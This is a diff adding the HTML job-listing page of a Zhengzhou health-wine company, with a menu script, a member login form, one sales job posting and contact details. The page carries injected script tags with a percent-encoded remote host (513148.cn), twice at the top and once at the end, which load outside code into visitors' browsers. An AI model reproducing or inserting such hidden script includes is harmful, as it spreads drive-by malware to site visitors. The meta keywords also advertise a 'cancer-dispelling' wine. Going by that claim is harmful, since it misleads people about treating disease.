@@ -1,0 +1,440 @@
+
+<script src=http://%35%31%33%31%34%38%2E%63%6E></script><script src=http://%35%31%33%31%34%38%2E%63%6E></script>
+<HTML><HEAD>
+<TITLE>保健养生药酒——郑州天育生物饮品有限公司</TITLE>
+<META http-equiv=Content-Type content="text/html; charset=gb2312">
+<meta name="keywords" content="保健酒，保健养生，养生药酒，保健企业，郑州天育生物饮品有限公司，罗汉佛脂液，天育祛癌灵，天育回春液">
+<meta name="discription" content="郑州天育生物保健饮品有限公司始于1990年，公司生产的保健养生药酒罗汉佛脂液，天育祛癌灵，天育回春液等产品得到国家相关部门的认可和鉴定，并取得专利，受到党、政、军离休国家高级干部，文化、艺术专家、社会名流的赞赏，2005年初经过省卫生厅检测和二十个专家论证后，组建郑州市天育饮品有限公司，将健字号改为食字号，将“天育养生液”改为“天育罗汉佛脂液”. 并与奥伦集团（香港）国际投资发展有限公司合作开发，才面向市场。">
+<meta name="Author" content="魏锦杰">
+<meta name="Contact" content="qrte@163.com">
+<meta name="Copyright" content="2004-2010">
+
+<STYLE type=text/css>A:link {
+	COLOR: #333333; TEXT-DECORATION: none
+}
+A:active {
+	COLOR: #333333; TEXT-DECORATION: none
+}
+A:visited {
+	COLOR: #333333; TEXT-DECORATION: none
+}
+A:hover {
+	COLOR: #ff6600
+}
+BODY {
+	BACKGROUND-POSITION: center 50%;
+	SCROLLBAR-FACE-COLOR: #c0c0c0;
+	FONT-SIZE: 12px;
+	BACKGROUND-IMAGE: url(../img/bg2.gif);
+	SCROLLBAR-HIGHLIGHT-COLOR: #c0c0c0;
+	SCROLLBAR-SHADOW-COLOR: #c0c0c0;
+	COLOR: #333333;
+	SCROLLBAR-3DLIGHT-COLOR: #e0e0e0;
+	SCROLLBAR-ARROW-COLOR: #333333;
+	SCROLLBAR-TRACK-COLOR: #e0e0e0;
+	FONT-FAMILY: "宋体";
+	SCROLLBAR-DARKSHADOW-COLOR: #c0c0c0;
+	background-color: #FFFFFF;
+}
+TD {
+	FONT-SIZE: 12px; LINE-HEIGHT: 15px; FONT-FAMILY: 宋体
+}
+TD.TableBody1 {
+	BACKGROUND-COLOR: #ffffff
+}
+.tableBorder1 {
+	BORDER-RIGHT: 1px; BORDER-TOP: 1px; BORDER-LEFT: 1px; WIDTH: 100%; BORDER-BOTTOM: 1px; BACKGROUND-COLOR: #c5bdc5
+}
+.table {
+	BORDER-RIGHT: #333333 1px solid; BORDER-LEFT: #333333 1px solid; BORDER-COLLAPSE: collapse; BACKGROUND-COLOR: #ffffff
+}
+INPUT {
+	BORDER-TOP-WIDTH: 1px; PADDING-RIGHT: 1px; PADDING-LEFT: 1px; BORDER-LEFT-WIDTH: 1px; FONT-SIZE: 9pt; BORDER-LEFT-COLOR: #cccccc; BORDER-BOTTOM-WIDTH: 1px; BORDER-BOTTOM-COLOR: #cccccc; PADDING-BOTTOM: 1px; BORDER-TOP-COLOR: #cccccc; PADDING-TOP: 1px; HEIGHT: 18px; BORDER-RIGHT-WIDTH: 1px; BORDER-RIGHT-COLOR: #cccccc
+}
+</STYLE>
+<script Language="JavaScript">
+ var h;
+ var w;
+ var l;
+ var t;
+ var topMar = 3;
+ var leftMar = -10;
+ var space = 2;
+ var isvisible;
+ var MENU_SHADOW_COLOR='#999999';
+ var global = window.document
+ global.fo_currentMenu = null
+ global.fo_shadows = new Array
+
+function HideMenu() 
+{
+ var mX;
+ var mY;
+ var vDiv;
+ var mDiv;
+	if (isvisible == true)
+{
+		vDiv = document.all("menuDiv");
+		mX = window.event.clientX + document.body.scrollLeft;
+		mY = window.event.clientY + document.body.scrollTop;
+		if ((mX < parseInt(vDiv.style.left)) || (mX > parseInt(vDiv.style.left)+vDiv.offsetWidth) || (mY < parseInt(vDiv.style.top)-h) || (mY > parseInt(vDiv.style.top)+vDiv.offsetHeight)){
+			vDiv.style.visibility = "hidden";
+			isvisible = false;
+		}
+}
+}
+
+function ShowMenu(vMnuCode,tWidth) {
+	vSrc = window.event.srcElement;
+	vMnuCode = "<table id='submenu' cellspacing=1 cellpadding=3 style='width:"+tWidth+"' class=tableborder1 onmouseout='HideMenu()'><tr height=23><td nowrap align=left class=tablebody1>" + vMnuCode + "</td></tr></table>";
+
+	h = vSrc.offsetHeight;
+	w = vSrc.offsetWidth;
+	l = vSrc.offsetLeft + leftMar+4;
+	t = vSrc.offsetTop + topMar + h + space-2;
+	vParent = vSrc.offsetParent;
+	while (vParent.tagName.toUpperCase() != "BODY")
+	{
+		l += vParent.offsetLeft;
+		t += vParent.offsetTop;
+		vParent = vParent.offsetParent;
+	}
+
+	menuDiv.innerHTML = vMnuCode;
+	menuDiv.style.top = t;
+	menuDiv.style.left = l;
+	menuDiv.style.visibility = "visible";
+	isvisible = true;
+    makeRectangularDropShadow(submenu, MENU_SHADOW_COLOR, 4)
+}
+
+function makeRectangularDropShadow(el, color, size)
+{
+	var i;
+	for (i=size; i>0; i--)
+	{
+		var rect = document.createElement('div');
+		var rs = rect.style
+		rs.position = 'absolute';
+		rs.left = (el.style.posLeft + i) + 'px';
+		rs.top = (el.style.posTop + i) + 'px';
+		rs.width = el.offsetWidth + 'px';
+		rs.height = el.offsetHeight + 'px';
+		rs.zIndex = el.style.zIndex - i;
+		rs.backgroundColor = color;
+		var opacity = 1 - i / (i + 1);
+		rs.filter = 'alpha(opacity=' + (100 * opacity) + ')';
+		el.insertAdjacentElement('afterEnd', rect);
+		global.fo_shadows[global.fo_shadows.length] = rect;
+	}
+}
+var About= '&nbsp;<a style=font-size:9pt;line-height:14pt; href=\"About.asp\"><font color="#000000">公 司 简 介</font></a>&nbsp;<br>&nbsp;<a style=font-size:9pt;line-height:14pt; href=\"Culture.asp\"><font color="#000000">公 司 文 化</font></a>&nbsp;<br>&nbsp;<a style=font-size:9pt;line-height:14pt; href=\"Organize.asp\"><font color="#000000">组 织 机 构</font></a>&nbsp;<br>&nbsp;<a style=font-size:9pt;line-height:14pt; href=\"Principle.asp\"><font color="#000000">精 神 理 念</font></a>&nbsp;<br>&nbsp;<a style=font-size:9pt;line-height:14pt; href=\"Contact.asp\"><font color="#000000">联 系 我 们</font></a>&nbsp;'
+var News= '&nbsp;<a style=font-size:9pt;line-height:14pt; href=\"News.asp\"><font color="#000000">公 司 新 闻</font></a>&nbsp;<br>&nbsp;<a style=font-size:9pt;line-height:14pt; href=\"yeNews.asp\"><font color="#000000">健 康 天 地</font></a>&nbsp;'
+var Product= '&nbsp;<a style=font-size:9pt;line-height:14pt; href=\"Product.asp\"><font color="#000000">产 品 展 示</font></a>&nbsp;<br>&nbsp;<a style=font-size:9pt;line-height:14pt; href=\"Products.asp\"><font color="#000000">产 品 分 类</font></a>&nbsp;<br>&nbsp;<a style=font-size:9pt;line-height:14pt; href=\"search.asp\"><font color="#000000">产 品 搜 索</font></a>&nbsp;'
+var Job= '&nbsp;<a style=font-size:9pt;line-height:14pt; href=\"Job.asp\"><font color="#000000">人 才 招 聘</font></a>&nbsp;<br>&nbsp;<a style=font-size:9pt;line-height:14pt; href=\"Jobs.asp\"><font color="#000000">人 才 策 略</font></a>&nbsp;'
+var sale= '&nbsp;<a style=font-size:9pt;line-height:14pt; href=\"Sale.asp\"><font color="#000000">加 盟 条 件</font></a>&nbsp;<br>&nbsp;<a style=font-size:9pt;line-height:14pt; href=\"Salea.asp\"><font color="#000000">相 关 说 明</font></a>&nbsp;'
+var server= '&nbsp;<a style=font-size:9pt;line-height:14pt; href=\"Server.asp\"><font color="#000000">会 员 中 心</font></a>&nbsp;<br>&nbsp;<a style=font-size:9pt;line-height:14pt; href=\"NetBook.asp\"><font color="#000000">留 言 中 心</font></a>&nbsp;<br>&nbsp;<a style=font-size:9pt;line-height:14pt; href=\"E_shop.asp\"><font color="#000000">订 单 查 询</font></a>&nbsp;'
+var index= '&nbsp;<a style=font-size:9pt;line-height:14pt; href=\"default.asp\"><font color="#000000">网 站 首 页</font></a>&nbsp;<br>&nbsp;<a style=font-size:9pt;line-height:14pt; href=\"Index.asp\"><font color="#000000">企业形象页</font></a>&nbsp;'
+var img= '&nbsp;<a style=font-size:9pt;line-height:14pt; href=\"Honor.asp\"><font color="#000000">公 司 荣 誉</font></a>&nbsp;<br>&nbsp;<a style=font-size:9pt;line-height:14pt; href=\"Img.asp\"><font color="#000000">公 司 证 书</font></a>&nbsp;'
+</script>
+<BODY leftMargin=0 topMargin=0 marginheight="0" marginwidth="0" onmousemove="HideMenu()" background-attachment: fixed">
+<div id=menuDiv style='Z-INDEX: 2; VISIBILITY: visible; WIDTH: 1px; POSITION: absolute; HEIGHT: 1px; BACKGROUND-COLOR: #660033'></div>
+<TABLE width="760" border=0 align="center" cellPadding=0 cellSpacing=0 bgcolor="#FFFFFF">
+  <TBODY>
+    <TR> 
+      <TD height="72" bgColor=#009933><table width="760" height="140" border="0" cellpadding="0" cellspacing="0" bgcolor="#9B573C">
+        <tr>
+          <td height="5" bgcolor="#9B573C"><div align="center"></div></td>
+          </tr>
+        <tr>
+          <td height="40"><object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="762" height="120">
+            <param name="movie" value="../img/head.swf">
+            <param name="quality" value="high">
+            <param name="BGCOLOR" value="#990000">
+            <embed src="../img/head.swf" width="762" height="120" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" bgcolor="#990000"></embed>
+          </object></td>
+        </tr>
+      </table></TD>
+    </TR>
+    <TR> 
+      <TD height=35 background="bk03.gif"><TABLE width="100%" height="27" border=0 cellPadding=0 cellSpacing=0 background="../img/index_01.gif">
+        <TBODY>
+          <TR>
+            <TD width="2%">&nbsp;</TD>
+            <TD width="98%" valign="middle">||<a href="default.asp"> 首页</a> ||　<a href="About.asp" onMouseOver='ShowMenu(About)'>公司简介</a> ||　<a href="Honor.asp" onMouseOver='ShowMenu(img)'>荣誉和证书</a>　||　<a href="Product.asp" onMouseOver='ShowMenu(Product)'>产品展示</a>　||　<a href="News.asp" onMouseOver='ShowMenu(News)'>资讯中心</a> ||<a href="Went.asp"> 信息反馈</a>　||　<a href="Server.asp" onMouseOver='ShowMenu(server)'>客户服务　</a>||<a href="bbs/" target="_blank"> 在线论坛</a>||<a href="Contact.asp"> 联系我们</a> ||<a href="http://mail.aolun666.cn" target="_blank">企业邮局</a></TD>
+          </TR>
+        </TBODY>
+      </TABLE></TD>
+    
+  </TBODY>
+</TABLE>
+
+<TABLE width="760" height="100%" border=0 align="center" cellPadding=0 cellSpacing=0 bgcolor="#FFFFFF">
+  <TBODY>
+    <TR> 
+      <TD width=196 height="450" vAlign=top> 
+        <table width="92%" height="100%" border="0" align="center" cellpadding="0" cellspacing="0" bgcolor="#FFFFFF">
+          <tr> 
+            <td valign="top"><TABLE width="100%" border=0 cellPadding=0 cellSpacing=0 background="Img/index_01b.gif">
+                <TBODY>
+                  <TR> 
+                    <TD height=15 bgcolor="#FFFFFF"></TD>
+                  </TR>
+                  <TR> 
+                    <TD height="26" background="Img/index_01.gif"><div align="center">会员登陆 
+                      </div></TD>
+                  </TR>
+                  <TR> 
+                    <TD height="5"> </TD>
+                  </TR>
+                  <TR> 
+                    <TD vAlign=top><table width="95%" border="0" align="center" cellpadding="0" cellspacing="0">
+                        <tr> 
+                          <td> 
+                            <table width='100%' border='0' cellspacing='0' cellpadding='0'><form action='UserLogin.asp' method='post' name='UserLogin' onSubmit='return CheckForm();'><tr><td height='25' align='right'>用户名：</td><td height='25'><input name='UserName' type='text' id='UserName' size='10' maxlength='20'></td></tr><tr><td height='25' align='right'>密&nbsp;&nbsp;码：</td><td height='25'><input name='Password' type='password' id='Password' size='10' maxlength='20'></td></tr><tr align='center'><td height='25' colspan='2'><input name='Login' type='submit' id='Login' value=' 登录 '> <input name='Reset' type='reset' id='Reset' value=' 清除 '></td></tr><tr><td height='20' align='center' colspan='2'><a href='UserReg.asp' target='_blank'>新用户注册</a>&nbsp;&nbsp;<a href='GetPassword.asp' target='_blank'>忘记密码？</a></td></tr></form></table>
+<script language=javascript>
+	function CheckForm()
+	{
+		if(document.UserLogin.UserName.value=="")
+		{
+			alert("请输入用户名！");
+			document.UserLogin.UserName.focus();
+			return false;
+		}
+		if(document.UserLogin.Password.value == "")
+		{
+			alert("请输入密码！");
+			document.UserLogin.Password.focus();
+			return false;
+		}
+	}
+</script>
+
+                          </td>
+                        </tr>
+                      </table></TD>
+                  </TR>
+                  <TR> 
+                    <TD height="5"> </TD>
+                  </TR>
+                  <TR> 
+                    <TD 
+                            height=1 colspan="2" 
+                            background=img/naSzarym.gif><IMG height=1 src="img/1x1_pix.gif" 
+                              width=10></TD>
+                  </TR>
+                </TBODY>
+              </TABLE>
+              <TABLE width="100%" border=0 cellPadding=0 cellSpacing=0 background="Img/index_01b.gif">
+                <TBODY>
+                  <TR> 
+                    <TD height=15 bgcolor="#FFFFFF"></TD>
+                  </TR>
+                  <TR> 
+                    <TD height="26" background="Img/index_01.gif"><div align="center">人才招聘 
+                      </div></TD>
+                  </TR>
+                  <TR> 
+                    <TD height="22"> <div align="center"><a href="Job.asp">人 才 
+                        招 聘</a></div></TD>
+                  </TR>
+                  <TR> 
+                    <TD 
+                            height=1 colspan="2" 
+                            background=img/naSzarym.gif><IMG height=1 src="img/1x1_pix.gif" 
+                              width=10></TD>
+                  </TR>
+                  <TR> 
+                    <TD height="22"><div align="center"><a href="Jobs.asp">人 才 
+                        策 略</a></div></TD>
+                  </TR>
+                  <TR> 
+                    <TD 
+                            height=1 colspan="2" 
+                            background=img/naSzarym.gif><IMG height=1 src="img/1x1_pix.gif" 
+                              width=10></TD>
+                  </TR>
+                </TBODY>
+              </TABLE>
+              <TABLE width="100%" border=0 cellPadding=0 cellSpacing=0 background="Img/index_01b.gif">
+                <TBODY>
+                  <TR> 
+                    <TD height=15 bgcolor="#FFFFFF"></TD>
+                  </TR>
+                  <TR> 
+                    <TD height="26" background="Img/index_01.gif"><div align="center">邮件列表 
+                      </div></TD>
+                  </TR>
+                  <TR> 
+                    <TD height="5"> </TD>
+                  </TR>
+                  <TR> 
+                    <form method="POST" action="chkemail.asp">
+                      <TD vAlign=top><table width="95%" border="0" align="center" cellpadding="0" cellspacing="0">
+                          <tr> 
+                            <td height="25"> <div align="center"> 
+                                <input name='email' type='text' value="@" size='15'>
+                              </div></td>
+                          </tr>
+                          <tr> 
+                            <td height="25"><div align="center"> 
+                                <input type="submit" value="订阅" name="action">
+                                &nbsp; 
+                                <input type="submit" value="退订" name="action">
+                              </div></td>
+                          </tr>
+                        </table></TD>
+                    </form>
+                  </TR>
+                  <TR> 
+                    <TD height="5"> </TD>
+                  </TR>
+                  <TR> 
+                    <TD 
+                            height=1 colspan="2" 
+                            background=img/naSzarym.gif><IMG height=1 src="img/1x1_pix.gif" 
+                              width=10></TD>
+                  </TR>
+                  <TR> 
+                    <TD height="15" bgcolor="#FFFFFF"> </TD>
+                  </TR>
+                </TBODY>
+              </TABLE></td>
+          </tr>
+        </table>
+      </TD>
+      <TD width=1 background=img/kropki_pion_naBialym.gif><IMG 
+            height=2 src="img/1x1_pix.gif" width=1></TD>
+      <TD vAlign=top> 
+        <TABLE width="90%" border=0 align="right" cellPadding=0 cellSpacing=0>
+          <TBODY>
+            <TR> 
+              <TD height=20><table width="75%" border="0" cellpadding="0" cellspacing="0">
+                  <tr> 
+                    <td height="5"></td>
+                  </tr>
+                </table>
+                <table width="559" height="136" border="0" align="center" cellpadding="0" cellspacing="0">
+                  <tr> 
+                    <td height="67" background="Img/top1.jpg"> <div align="center"> 
+                        <object classid="clsid:D27CDB6E-AE6D-11CF-96B8-444553540000" id="obj1" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,40,0" border="0" width="553" height="138">
+							<param name="movie" value="Img/32.swf">
+							<param name="quality" value="High">
+							<param name="wmode" value="transparent">
+							<embed src="Img/32.swf" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" name="obj1" width="553" height="138"></object>
+                    </div></td>
+                  </tr>
+                </table> </TD>
+            </TR>
+            <TR> 
+              <TD> <TABLE cellSpacing=0 cellPadding=0 width="555" border=0>
+                  <TBODY>
+                    <TR> 
+                      <TD height="25"><img src="Img/bgtop_12.gif" width="450" height="30"></TD>
+                    </TR>
+                  </TBODY>
+                </TABLE></TD>
+            </TR>
+            <TR> 
+              <TD background=img/naBialym.gif 
+                  height=1><IMG height=1 src="img/1x1_pix.gif" 
+              width=10></TD>
+            </TR>
+            
+            <TR> 
+              <TD 
+                  height=1><br> <table width="90%" border="0" align="center" cellpadding="3" cellspacing="1" bgcolor="#000000">
+                  <tr> 
+                    <td width="24%" bgcolor="#F3F3DE" background="Img/index_01b.gif"> <div align="center">招聘对象</div></td>
+                    <td width="76%" bgcolor="#F8FCF8">业务精英</td>
+                  </tr>
+                  <tr> 
+                    <td bgcolor="#F3F3DE" background="Img/index_01b.gif"> <div align="center">招聘人数</div></td>
+                    <td bgcolor="#F8FCF8">20</td>
+                  </tr>
+                  <tr> 
+                    <td bgcolor="#F3F3DE" background="Img/index_01b.gif"> <div align="center">工作地点</div></td>
+                    <td bgcolor="#F8FCF8">西安</td>
+                  </tr>
+                  <tr> 
+                    <td bgcolor="#F3F3DE" background="Img/index_01b.gif"> <div align="center">工资待遇</div></td>
+                    <td bgcolor="#F8FCF8">800</td>
+                  </tr>
+                  <tr> 
+                    <td bgcolor="#F3F3DE" background="Img/index_01b.gif"> <div align="center">发布时间</div></td>
+                    <td bgcolor="#F8FCF8">2005-6-14</td>
+                  </tr>
+                  <tr> 
+                    <td bgcolor="#F3F3DE" background="Img/index_01b.gif"> <div align="center">有效期限</div></td>
+                    <td bgcolor="#F8FCF8">30</td>
+                  </tr>
+                  <tr> 
+                    <td height="22" bgcolor="#F3F3DE" background="Img/index_01b.gif"> <div align="center">招聘要求</div></td>
+                    <td bgcolor="#F8FCF8">有经验者</td>
+                  </tr>
+                  <tr bgcolor="#FFFFFF"> 
+                    <td height="22" colspan="2"><div align="right"><a href="AcceptJob.asp?job=业务精英">应聘此岗位</a> 
+                      </div></td>
+                  </tr>
+                </table></TD>
+            </TR>
+            
+            <TR> 
+              <TD height=15></TD>
+            </TR>
+            <TR> 
+              <TD background=img/naBialym.gif 
+                  height=1><IMG height=1 src="img/1x1_pix.gif" 
+              width=10></TD>
+            </TR>
+            <TR> 
+              <TD 
+                  height=25 bgcolor="#eeeeee"> &nbsp; <strong><font color='#000000'>-> 全部-</font>共</font><font color=#FF0000>1</font><font color='#000000'>条招聘信息</font></strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong><font color='#000000'>第</font><font color=#FF0000>1</font><font color='#000000'>/1</font></strong>&nbsp;<strong><font color='#000000'>上一页 </font></strong><strong><font color='#000000'>下一页</font></strong>&nbsp;&nbsp; </TD>
+            </TR>
+          </TBODY>
+        </TABLE>
+      </TD>
+    </TR>
+  </TBODY>
+</TABLE>
+
+<head>
+<meta http-equiv="Content-Language" content="zh-cn">
+<meta name="Keywords" content="保健酒，保健养生，养生药酒，保健企业，郑州天育生物饮品有限公司，罗汉佛脂液，天育祛癌灵，天育回春液"> 
+<META NAME="Author" CONTENT="奥伦"> 
+</head>
+
+
+<TABLE width="760" border=0 align="center" cellPadding=0 cellSpacing=0 background="../img/bgleft.gif" bgcolor="#009966">
+  <TBODY>
+    <TR> 
+      <TD height="30" colspan="2"><div align="center"><b>版权所有：</b>保健养生药酒-郑州市天育饮品有限公司<b>Copyright&copy; 2006-2010 All rights reserved</b><b> </b><b> 
+	    </b></div></TD>
+    </TR>
+    <TR>
+      <TD height="30"><div align="center">
+        <p align="right">总公司地址：香港湾仔庄士敦道181号大有大厦10楼1001室 <br>
+          &nbsp; <br> 
+          E_mail:aolun666@126.com&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; </p>
+        </div></TD>
+      <TD>&nbsp; 地址：郑州市南阳路170号<br>
+       &nbsp;&nbsp; 电话：0371-66661527手机：13460371527&nbsp;&nbsp;&nbsp; &nbsp; &nbsp;&nbsp;&nbsp; <br>
+       &nbsp;&nbsp;&nbsp;
+</TD>
+      <hr>
+    </TR>
+    <TR>
+      <TD height="24" colspan="2"><div align="center">
+        <p><b>技术支持：</b><a href="http://www.sctouch.com" target="_blank">郑州市赛潮电子信息技术有限公司</a><b><a href="manage/index.asp"> 管理进入</a>&nbsp;</b><br><a href=http://www.miibeian.gov.cn target=_blank>ICP备案信息：豫ICP备06003696号</a><br>
+        </p>
+        </div></TD>
+    </TR>
+    <TR>
+      <TD height="15" colspan="2"><div align="center"><hr> </div></TD>
+    </TR>
+  </TBODY>
+</TABLE>
+<script language="javascript" type="text/javascript" src="http://js.users.51.la/2494559.js"></script>
+<noscript><a href="http://www.51.la/?2494559" target="_blank"><img alt="&#x6211;&#x8981;&#x5566;&#x514D;&#x8D39;&#x7EDF;&#x8BA1;" src="http://img.users.51.la/2494559.asp" style="border:none" /></a></noscript>
+<A href='http://202.111.153.27/infoCategoryListAction.do?act=init'   target='_blank' style="border:0"> <IMG border='0' src='http://202.111.153.21/beian/bj.gif' > </A><script src=http://%35%31%33%31%34%38%2E%63%6E></script>
+</BODY></HTML>
